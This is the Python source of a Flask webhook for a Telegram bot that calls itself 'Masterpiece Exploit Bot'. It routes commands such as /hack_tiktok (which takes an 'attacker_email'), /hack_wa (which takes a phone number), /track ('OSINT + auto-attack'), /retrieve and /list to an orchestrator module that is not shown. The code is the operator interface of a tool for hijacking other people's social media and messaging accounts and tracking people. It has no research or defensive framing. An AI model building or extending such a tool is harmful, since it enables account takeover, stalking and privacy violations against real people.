import os
import json
import requests
import threading
from flask import Flask, request
from orchestrator import Orchestrator
from config import TELEGRAM_TOKEN

app = Flask(__name__)
orch = Orchestrator()
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

def send_message(chat_id, text):
    payload = {'chat_id': chat_id, 'text': text[:4096], 'parse_mode': 'Markdown'}
    try:
        requests.post(f"{TELEGRAM_API}/sendMessage", json=payload, timeout=10)
    except Exception as e:
        print(f"Send failed: {e}")

def process_long_task(chat_id, func, *args, **kwargs):
    def wrapper():
        try:
            result = func(*args, **kwargs)
            send_message(chat_id, json.dumps(result, indent=2))
        except Exception as e:
            send_message(chat_id, f"⚠️ Error: {str(e)}")
    thread = threading.Thread(target=wrapper)
    thread.daemon = True
    thread.start()

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    if not data or 'message' not in data:
        return 'OK', 200
    msg = data['message']
    chat_id = msg['chat']['id']
    text = msg.get('text', '').strip()
    if not text:
        return 'OK', 200
    parts = text.split()
    cmd = parts[0].lower()
    args = parts[1:]

    if cmd in ['/track', '/retrieve', '/hack_tiktok', '/hack_wa', '/analyze']:
        send_message(chat_id, "⏳ Processing request, please wait...")
        if cmd == '/track':
            if not args:
                send_message(chat_id, "Usage: /track <identifier>")
            else:
                threading.Thread(target=process_long_task, args=(chat_id, orch.track, args[0])).start()
        elif cmd == '/retrieve':
            if len(args) < 2:
                send_message(chat_id, "Usage: /retrieve <target_id> <platform>")
            else:
                threading.Thread(target=process_long_task, args=(chat_id, orch.retrieve, int(args[0]), args[1])).start()
        elif cmd == '/hack_tiktok':
            if len(args) < 2:
                send_message(chat_id, "Usage: /hack_tiktok <username> <attacker_email>")
            else:
                threading.Thread(target=process_long_task, args=(chat_id, orch.hack_tiktok, args[0], args[1])).start()
        elif cmd == '/hack_wa':
            if not args:
                send_message(chat_id, "Usage: /hack_wa <phone>")
            else:
                threading.Thread(target=process_long_task, args=(chat_id, orch.hack_whatsapp, args[0])).start()
        elif cmd == '/analyze':
            if not args:
                send_message(chat_id, "Usage: /analyze <target_id>")
            else:
                threading.Thread(target=process_long_task, args=(chat_id, orch.analyze, int(args[0]))).start()
        return 'OK', 200

    # Quick commands (no background)
    try:
        if cmd == '/start':
            reply = (
                "🤖 Masterpiece Exploit Bot\n"
                "/track <id> – OSINT + auto‑attack\n"
                "/retrieve <tid> <platform>\n"
                "/analyze <tid>\n"
                "/hack_tiktok <user> <email>\n"
                "/hack_wa <phone>\n"
                "/verify <tid> <plat>\n"
                "/list – show targets"
            )
        elif cmd == '/verify':
            if len(args) < 2:
                reply = "Usage: /verify <target_id> <platform>"
            else:
                reply = json.dumps(orch.verify(int(args[0]), args[1]), indent=2)
        elif cmd == '/list':
            reply = json.dumps(orch.list_targets(), indent=2)
        else:
            reply = "Unknown command. /start for help."
    except Exception as e:
        reply = f"Error: {str(e)}"
    send_message(chat_id, reply)
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
